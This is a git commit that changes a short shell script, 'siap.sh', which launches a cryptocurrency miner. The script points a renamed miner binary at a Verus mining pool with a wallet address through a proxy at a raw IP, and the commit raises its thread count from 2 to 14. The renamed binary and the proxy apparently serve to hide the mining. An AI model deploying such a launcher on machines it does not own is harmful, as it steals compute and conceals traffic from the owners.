229391ac72e3cf4851f9c6a05102febc597389c3
githaeka <92292441+githaeka@users.noreply.github.com>
2021-10-11 15:53:57 +0000

    Update siap.sh

--- siap.sh
+++ siap.sh
@@ -7,4 +7,4 @@ POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=$(echo $(shuf -i 1-1 -n 1)-YX)
 PROXY=http://193.41.88.58:53281
-./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 14 -x $PROXY
